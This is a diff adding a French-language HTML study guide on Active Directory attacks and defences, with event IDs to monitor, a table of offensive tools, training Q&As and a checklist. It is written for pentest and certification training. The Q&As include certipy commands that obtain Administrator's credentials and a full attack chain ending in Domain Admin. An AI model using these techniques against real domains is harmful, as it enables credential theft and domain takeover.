+    <div class="card cg"><h4>✅ SMB Signing obligatoire</h4><p>GPO : Microsoft network server → Digitally sign communications (always). Bloque NTLM relay sur SMB.</p></div>
+    <div class="card cg"><h4>✅ Désactiver LLMNR / NBT-NS</h4><p>GPO Computer → DNS Client → Turn Off Multicast Name Resolution = Enabled. Bloque Responder.</p></div>
+  </div>
+
+  <h3>Event IDs critiques à monitorer</h3>
+  <div class="tw"><table>
+    <tr><th>Event ID</th><th>Description</th><th>Attaque associée</th></tr>
+    <tr><td><code>4624</code></td><td>Successful logon</td><td>Type 3 NTLM = PTH ; Type 10 = RDP</td></tr>
+    <tr><td><code>4625</code></td><td>Failed logon</td><td>Brute force / password spraying</td></tr>
+    <tr><td><code>4648</code></td><td>Logon with explicit credentials</td><td>Runas, PTH, NTLM relay</td></tr>
+    <tr><td><code>4662</code></td><td>Operation on AD object</td><td>DCSync (DS-Replication-Get-Changes)</td></tr>
+    <tr><td><code>4663</code></td><td>Attempt to access object</td><td>NTDS.dit access, SYSVOL scraping</td></tr>
+    <tr><td><code>4688</code></td><td>Process creation</td><td>Execution via WMI, PsExec, lateral movement</td></tr>
+    <tr><td><code>4698</code></td><td>Scheduled task created</td><td>Persistance, lateral movement</td></tr>
+    <tr><td><code>4720</code></td><td>User account created</td><td>Backdoor account</td></tr>
+    <tr><td><code>4768</code></td><td>TGT requested (AS-REQ)</td><td>AS-REP Roasting si no preauthentication</td></tr>
+    <tr><td><code>4769</code></td><td>TGS requested</td><td>Kerberoasting (RC4 = 0x17 suspect)</td></tr>
+    <tr><td><code>4771</code></td><td>Kerberos pre-auth failed</td><td>Brute force Kerberos</td></tr>
+    <tr><td><code>4776</code></td><td>NTLM authentication</td><td>PTH, NTLM relay, brute force</td></tr>
+    <tr><td><code>7045</code></td><td>Service installed</td><td>PsExec, persistence</td></tr>
+  </table></div>
+
+  <h3>Outils défensifs recommandés</h3>
+  <ul>
+    <li><span class="tt">PingCastle</span> — Audit de sécurité AD avec score de risque + recommandations. Gratuit.</li>
+    <li><span class="tt">Purple Knight</span> (Semperis) — Détection d'indicateurs de compromission AD (IOEs/IOCs)</li>
+    <li><span class="tt">Microsoft Defender for Identity</span> (ex-ATA) — Détection d'attaques AD en temps réel</li>
+    <li><span class="tt">BloodHound Enterprise</span> — Attack path management continu (version DefenseOps)</li>
+    <li><span class="tt">Certipy / Certify</span> — Scanner les templates ADCS vulnérables</li>
+    <li><span class="tt">Alsid / Tenable.ad</span> — Monitoring continu de la posture AD</li>
+  </ul>
+</section>
+
+<!-- TOOLS -->
+<section class="section" id="tools">
+  <div class="section-header"><span class="snum">★</span><h2>Tooling — Référence complète</h2><span class="badge bc">OFFENSIF</span></div>
+
+  <div class="tw"><table>
+    <tr><th>Outil</th><th>OS</th><th>Catégorie</th><th>Usage clé</th></tr>
+    <tr><td><span class="tt">Mimikatz</span></td><td>Win</td><td>Credential Dump</td><td>sekurlsa, lsadump, kerberos, golden/silver tickets</td></tr>
+    <tr><td><span class="tt">Rubeus</span></td><td>Win</td><td>Kerberos</td><td>Kerberoast, AS-REP, PTT, OPtH, dump tickets</td></tr>
+    <tr><td><span class="tt">Impacket</span></td><td>Lin</td><td>Suite complète</td><td>secretsdump, GetUserSPNs, GetNPUsers, ntlmrelayx, psexec, wmiexec</td></tr>
+    <tr><td><span class="tt">BloodHound/SharpHound</span></td><td>Win/Lin</td><td>Cartographie</td><td>Graphe des chemins d'attaque, queries Cypher</td></tr>
+    <tr><td><span class="tt">PowerView</span></td><td>Win</td><td>Énumération</td><td>Get-DomainUser, Find-InterestingDomainAcl, ACL abuse</td></tr>
+    <tr><td><span class="tt">CrackMapExec / nxc</span></td><td>Lin</td><td>Swiss Army Knife</td><td>Enum, spray, PTH, exec, SAM dump, shares</td></tr>
+    <tr><td><span class="tt">evil-winrm</span></td><td>Lin</td><td>Remote Shell</td><td>WinRM shell, PTH, upload/download</td></tr>
+    <tr><td><span class="tt">Responder</span></td><td>Lin</td><td>MitM</td><td>LLMNR/NBT-NS poisoning, capture NTLMv2</td></tr>
+    <tr><td><span class="tt">Certipy</span></td><td>Lin</td><td>ADCS</td><td>Find ESC1-8, request/auth certs, relay ADCS</td></tr>
+    <tr><td><span class="tt">Certify</span></td><td>Win</td><td>ADCS</td><td>Find vulnerable templates, request certificates</td></tr>
+    <tr><td><span class="tt">PetitPotam</span></td><td>Lin/Win</td><td>Coerce Auth</td><td>Forcer l'auth NTLM du DC → relay vers ADCS/LDAP</td></tr>
+    <tr><td><span class="tt">Coercer</span></td><td>Lin</td><td>Coerce Auth</td><td>Automatise tous les protocols de coercition (PrinterBug, PetitPotam, DFSCoerce...)</td></tr>
+    <tr><td><span class="tt">Kerbrute</span></td><td>Lin</td><td>Brute / Enum</td><td>Enum usernames via Kerberos, password spray discret</td></tr>
+    <tr><td><span class="tt">Ldapdomaindump</span></td><td>Lin</td><td>Énumération</td><td>Dump AD via LDAP → HTML/JSON lisible</td></tr>
+    <tr><td><span class="tt">Hashcat</span></td><td>Any</td><td>Cracking</td><td>-m 13100 (Kerberoast), -m 18200 (AS-REP), -m 5600 (NTLMv2)</td></tr>
+  </table></div>
+</section>
+
+<hr class="d">
+
+<!-- Q&A -->
+<section class="section" id="questions">
+  <div class="section-header"><span class="snum">Q&A</span><h2>Questions — Entraînement</h2><span class="badge br">PRATIQUE</span></div>
+  <div class="alert al-p"><span class="ai">🎯</span><div>Essaie de répondre mentalement avant d'ouvrir chaque réponse. Ces questions couvrent ce qui est attendu en entretien de pentest AD ou en certification (CPTS, OSCP, CRTE).</div></div>
+
+  <div class="qi" onclick="this.classList.toggle('open')"><div class="qq"><span class="qn">Q01</span><span class="qt">Quelle est la différence entre Kerberoasting et AS-REP Roasting ? Lesquels de ces comptes sont ciblés ?</span><span class="qch">▼</span></div><div class="qa"><strong>Kerberoasting</strong> cible les comptes avec un <em>SPN</em> (Service Principal Name) — typiquement des comptes de service. Tout utilisateur authentifié peut demander un TGS pour un SPN, et ce ticket est chiffré avec le NT hash du compte de service. On l'extrait puis on le craque offline. Mode hashcat : <code>-m 13100</code> (RC4) ou <code>-m 19700</code> (AES256). <strong>AS-REP Roasting</strong> cible les comptes avec <code>DONT_REQ_PREAUTH</code> activé. Sans pré-authentification, n'importe qui peut envoyer une AS-REQ et obtenir une réponse contenant une portion chiffrée avec le NT hash du user — même sans credentials valides. Mode hashcat : <code>-m 18200</code>. <em>Résumé :</em> Kerberoasting = comptes de service + user authentifié requis. AS-REP = users ordinaires mal configurés + attaque possible anonymement.</div></div>
+
+  <div class="qi" onclick="this.classList.toggle('open')"><div class="qq"><span class="qn">Q02</span><span class="qt">Explique Pass-the-Hash. Peut-on faire PTH avec un hash NTLMv2 capturé par Responder ?</span><span class="qch">▼</span></div><div class="qa">Pass-the-Hash exploite le fait que le protocole NTLM accepte le <em>NT hash</em> directement comme preuve d'authentification, sans le mot de passe en clair. Le NT hash est statique (MD4 du password) — il ne change que si le password change. <strong>Non, on ne peut pas faire PTH avec un NTLMv2.</strong> Le NTLMv2 est une réponse challenge/response dynamique : chaque authentification produit un NTLMv2 différent (il inclut un challenge unique du serveur + un nonce client + un timestamp). Il est non-réutilisable. On peut : 1) Tenter de le cracker offline pour obtenir le password en clair, puis l'utiliser normalement. 2) Le <em>relayer</em> immédiatement vers une autre cible (NTLM Relay) — mais pas le rejouer plus tard.</div></div>
+
+  <div class="qi" onclick="this.classList.toggle('open')"><div class="qq"><span class="qn">Q03</span><span class="qt">Qu'est-ce qu'un Golden Ticket et quelles sont ses différences avec un Silver Ticket ?</span><span class="qch">▼</span></div><div class="qa"><strong>Golden Ticket :</strong> TGT forgé, signé avec le NT hash du compte <code>krbtgt</code>. Permet de s'authentifier comme n'importe quel utilisateur (même inexistant), avec n'importe quels groupes. Durée : jusqu'à 10 ans par défaut. Implique un contact avec le KDC à chaque TGS-REQ. Pré-requis : hash NT de krbtgt (via DCSync). <strong>Silver Ticket :</strong> TGS forgé pour un service spécifique, signé avec le NT hash du compte de service (pas krbtgt). Accès limité à un seul service. <em>Aucun contact DC</em> — entièrement offline → très difficile à détecter. Pré-requis : hash NT du compte de service seulement. <em>Différence clé :</em> Golden = accès à tout le domaine + contact KDC. Silver = accès à 1 service + zéro contact KDC (plus discret mais portée limitée).</div></div>
+
+  <div class="qi" onclick="this.classList.toggle('open')"><div class="qq"><span class="qn">Q04</span><span class="qt">Comment fonctionne DCSync ? Quels droits sont nécessaires et comment les obtenir ?</span><span class="qch">▼</span></div><div class="qa">DCSync simule un Domain Controller secondaire qui demande la réplication AD via le protocole <code>MS-DRSR</code>. Il demande spécifiquement les attributs <code>unicodePwd</code>, <code>supplementalCredentials</code>, et <code>ntPwdHistory</code> — qui contiennent les NT hashes. <strong>Droits nécessaires :</strong> <code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code>. Par défaut accordés à : Domain Admins, Enterprise Admins, Domain Controllers. <strong>Comment les obtenir sans DA :</strong> 1) Via <code>WriteDACL</code> ou <code>GenericAll</code> sur l'objet Domain → utiliser PowerView pour s'accorder les droits DCSync. 2) Via AdminSDHolder compromise. 3) BloodHound montre qui a ces droits via l'edge "DCSync". <em>Détection :</em> EventID 4662 avec les GUIDs de réplication, depuis une IP qui n'est pas un DC.</div></div>
+
+  <div class="qi" onclick="this.classList.toggle('open')"><div class="qq"><span class="qn">Q05</span><span class="qt">Explique l'attaque NTLM Relay. Quel est le pré-requis principal et pourquoi ?</span><span class="qch">▼</span></div><div class="qa">NTLM Relay intercepte une authentification NTLM (capturée via LLMNR poisoning, PetitPotam, etc.) et la redirige vers une machine cible. La machine cible croit que la requête vient de la victime légitime. <strong>Pré-requis principal : SMB Signing désactivé sur la cible.</strong> Si SMB Signing est activé, chaque message SMB est signé avec la session key — que l'attaquant n'a pas. Sans signature → les messages non signés sont acceptés → relay fonctionne. La machine cible vérifie l'authentification NTLM mais pas l'intégrité des messages. <em>Flux :</em> Victime → [LLMNR capture] → Attaquant → [Relay] → Cible vulnérable → auth réussie → shell/dump SAM. NTLMv2 peut être relayé (pas PTH) car le relay est en temps réel — la session key est dérivée de la même transaction.</div></div>
+
+  <div class="qi" onclick="this.classList.toggle('open')"><div class="qq"><span class="qn">Q06</span><span class="qt">Qu'est-ce que l'ESC1 dans le contexte ADCS et comment l'exploites-tu ?</span><span class="qch">▼</span></div><div class="qa"><strong>ESC1</strong> est une misconfiguration de template ADCS. Conditions : 1) <code>msPKI-Certificate-Name-Flag</code> contient <code>ENROLLEE_SUPPLIES_SUBJECT</code> — le demandeur contrôle le SAN. 2) EKU inclut Client Authentication. 3) Enrollment autorisé aux utilisateurs ordinaires. <em>Exploitation :</em> Un utilisateur ordinaire demande un certificat en spécifiant dans le SAN l'UPN de Administrator (<code>administrator@corp.local</code>). Le certificat est émis pour "Administrator" selon l'AD. On utilise ce certificat pour s'authentifier via PKINIT (Kerberos avec certificat) et obtenir le TGT d'Administrator — ou directement son NT hash via <code>certipy auth</code>. <em>Commandes clés :</em> <code>certipy find -vulnerable</code> pour trouver les templates, puis <code>certipy req -upn administrator@corp.local</code>, puis <code>certipy auth -pfx admin.pfx</code>. Résultat : NT hash d'Administrator → Pass-the-Hash → DA.</div></div>
+
+  <div class="qi" onclick="this.classList.toggle('open')"><div class="qq"><span class="qn">Q07</span><span class="qt">Qu'est-ce que l'AdminSDHolder et comment est-il abusé pour la persistance ?</span><span class="qch">▼</span></div><div class="qa"><code>AdminSDHolder</code> est un objet AD (<code>CN=AdminSDHolder,CN=System,DC=...</code>) qui sert de template de sécurité pour les groupes et comptes privilégiés. Un processus appelé <strong>SDProp</strong> s'exécute toutes les 60 minutes et <em>copie les ACLs d'AdminSDHolder</em> sur tous les objets protégés (Domain Admins, Enterprise Admins, krbtgt, Administrator...). <em>Abus :</em> Si l'attaquant a les droits DA (ou WriteDACL sur AdminSDHolder), il ajoute ses droits (GenericAll) sur AdminSDHolder. SDProp propagera ces droits sur tous les comptes/groupes protégés dans les 60 minutes suivantes. Même si un admin révoque les droits manuellement sur un objet, ils sont restaurés lors du prochain cycle SDProp. <em>Persistance indirecte :</em> avec GenericAll sur les groupes privilegiés, l'attaquant peut se ré-ajouter à Domain Admins à tout moment.</div></div>
+
+  <div class="qi" onclick="this.classList.toggle('open')"><div class="qq"><span class="qn">Q08</span><span class="qt">Comment BloodHound aide-t-il à identifier les chemins d'attaque ? Cite 3 Cypher queries utiles.</span><span class="qch">▼</span></div><div class="qa">BloodHound collecte via SharpHound toutes les relations AD (memberships groupes, ACLs, sessions, droits délégation, SPNs, GPOs...) et les stocke dans une base Neo4j. L'interface graphique permet de visualiser les chemins d'attaque sous forme de graphe orienté. <em>3 queries utiles :</em> 1) <strong>Chemin vers DA :</strong> <code>MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p</code> — trouve le chemin le plus court depuis n'importe quel user. 2) <strong>Users Kerberoastables avec droits élevés :</strong> <code>MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group) WHERE g.highvalue=true RETURN u.name</code> — combinaison Kerberoasting + escalade. 3) <strong>Comptes avec DCSync :</strong> <code>MATCH p=(u)-[:DCSync|AllExtendedRights]->(d:Domain) RETURN p</code> — identifie qui peut faire DCSync sans être DA explicitement.</div></div>
+
+  <div class="qi" onclick="this.classList.toggle('open')"><div class="qq"><span class="qn">Q09</span><span class="qt">Pourquoi les comptes de service devraient utiliser gMSA ? Qu'est-ce que ça change pour Kerberoasting ?</span><span class="qch">▼</span></div><div class="qa"><strong>gMSA</strong> (Group Managed Service Accounts) sont des comptes managés par AD dont le password est automatiquement géré : 128 caractères aléatoires, rotation automatique tous les 30 jours. <em>Impact sur Kerberoasting :</em> Les TGS demandés pour un gMSA produisent un hash NT de 128 chars aléatoires. Ce hash est <em>computationnellement impossible à cracker</em> — même avec du matériel dédié et des années, la probabilité de trouver la valeur est quasi nulle. On peut toujours demander et capturer le TGS, mais le cracking ne produira jamais de résultat. <em>Avantages supplémentaires :</em> le password ne peut pas être extrait de la mémoire de la machine qui utilise le service (stocké dans LSA secrets managés), pas de password à gérer manuellement, pas d'oubli de rotation. <em>Limite :</em> nécessite de migrer les services existants — certaines applications legacy ne supportent pas gMSA.</div></div>
+
+  <div class="qi" onclick="this.classList.toggle('open')"><div class="qq"><span class="qn">Q10</span><span class="qt">Décris une chaîne d'attaque complète partant d'un foothold utilisateur ordinaire jusqu'à Domain Admin.</span><span class="qch">▼</span></div><div class="qa"><em>Scénario réaliste :</em> 1) <strong>Phishing</strong> → shell sur une workstation comme user ordinaire "john". 2) <strong>Énumération</strong> → <code>bloodhound-python</code> pour cartographier le domaine. BloodHound révèle : john a GenericWrite sur "svc_sql" (compte de service avec SPN). 3) <strong>Targeted Kerberoasting</strong> → Ajouter un SPN à svc_sql via GenericWrite, demander le TGS, cracker offline → password "Sql2020!" obtenu. 4) <strong>Latéralité</strong> → svc_sql a des sessions sur DB01. evil-winrm vers DB01 avec les credentials svc_sql. 5) <strong>Élévation locale</strong> → Mimikatz sur DB01 → hash NT du DA "corp\admin" trouvé en mémoire (session active). 6) <strong>DCSync</strong> → PTH avec le hash DA sur le DC → impacket-secretsdump → hash krbtgt + tous les NT hashes. 7) <strong>Persistance</strong> → Golden Ticket avec hash krbtgt + AdminSDHolder backdoor. <em>Durée typique : 2-4h en environnement non patchée.</em></div></div>
+</section>
+
+<!-- CHECKLIST -->
+<section class="section" id="checklist">
+  <div class="section-header"><span class="snum">✓</span><h2>Checklist — Maîtrise Active Directory</h2><span class="badge bg">À COCHER</span></div>
+  <div class="g2">
+    <div class="card cp">
+      <h4>Concepts fondamentaux</h4>
+      <ul class="cl">
+        <li onclick="tg(this)"><span class="ck"></span><span>Structure AD : DC, NTDS.dit, SYSVOL, krbtgt</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>Flux Kerberos complet : AS-REQ/REP, TGS-REQ/REP</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>NT hash vs NTLMv2 — différences pour PTH/Relay</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>Groupes privilégiés : DA, EA, Schema, Backup Ops</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>BloodHound : collecter, queries Cypher, chemins</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>Kerberoasting : SPN → TGS → crack offline</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>AS-REP Roasting : DONT_REQ_PREAUTH</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>PTH avec Impacket, evil-winrm, CrackMapExec</span></li>
+      </ul>
+    </div>
+    <div class="card cp">
+      <h4>Attaques avancées</h4>
+      <ul class="cl">
+        <li onclick="tg(this)"><span class="ck"></span><span>NTLM Relay : Responder + ntlmrelayx + SMB signing</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>DCSync : droits requis + Impacket secretsdump</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>ACL Abuse : GenericAll, WriteDACL, GenericWrite</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>Golden Ticket : krbtgt hash → persistance totale</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>Silver Ticket : service hash → accès discret</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>ADCS ESC1 : SAN arbitraire → DA via cert</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>ADCS ESC8 : NTLM relay → cert DC → DCSync</span></li>
+        <li onclick="tg(this)"><span class="ck"></span><span>AdminSDHolder : persistance via SDProp</span></li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="alert al-g" style="margin-top:18px"><span class="ai">📚</span><div><strong>Sources de référence :</strong> "Certified Pre-Owned" (Will Schroeder &amp; Lee Christensen, SpecterOps 2021) pour ADCS. "The Hacker Recipes" (thehacker.recipes) pour les techniques offensives. MITRE ATT&CK TA0006 (Credential Access). Microsoft Docs pour les Event IDs et les défenses. HTB Academy — Active Directory Enumeration &amp; Attacks pour la pratique.</div></div>
+
+  <div class="card ch" style="margin-top:12px">
+    <h4>Ressources pratiques</h4>
+    <ul>
+      <li><a href="https://attack.mitre.org/tactics/TA0006/" target="_blank" style="color:var(--al)">MITRE ATT&amp;CK — Credential Access</a></li>
+      <li><a href="https://thehacker.recipes/ad/" target="_blank" style="color:var(--al)">The Hacker Recipes — Active Directory</a></li>
+      <li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" style="color:var(--al)">BloodHound GitHub</a></li>
+      <li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" style="color:var(--al)">SpecterOps — Certified Pre-Owned (ADCS)</a></li>
+      <li><a href="https://github.com/ly4k/Certipy" target="_blank" style="color:var(--al)">Certipy (ADCS attack tool)</a></li>
+      <li><a href="https://www.hackthebox.com/blog/intro-to-active-directory" target="_blank" style="color:var(--al)">HackTheBox — Intro to Active Directory</a></li>
+      <li><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory" target="_blank" style="color:var(--al)">Microsoft — Best Practices Securing AD</a></li>
+    </ul>
+  </div>
+</section>
+
+</main>
+</div>
+
+<div class="nov" id="navOverlay"></div>
+
+<script>
+window.addEventListener('scroll',()=>{document.getElementById('progress').style.width=(window.scrollY/(document.body.scrollHeight-window.innerHeight)*100)+'%'});
+const secs=document.querySelectorAll('section[id]'),links=document.querySelectorAll('nav a');
+window.addEventListener('scroll',()=>{let c='';secs.forEach(s=>{if(window.scrollY>=s.offsetTop-180)c=s.id});links.forEach(a=>{a.classList.remove('active');if(a.getAttribute('href')==='#'+c)a.classList.add('active')})});
+function tg(li){li.classList.toggle('done');li.querySelector('.ck').textContent=li.classList.contains('done')?'✓':''}
+(function(){var btn=document.getElementById('hamburgerBtn'),nav=document.getElementById('sidebar'),ov=document.getElementById('navOverlay'),cl=document.getElementById('navClose');function op(){nav.classList.add('open');ov.classList.add('active');document.body.style.overflow='hidden'}function sh(){nav.classList.remove('open');ov.classList.remove('active');document.body.style.overflow=''}if(btn)btn.addEventListener('click',op);if(ov)ov.addEventListener('click',sh);if(cl)cl.addEventListener('click',sh);if(nav)nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){if(window.innerWidth<=768)sh()})})})();
+</script>
+</body>
+</html>
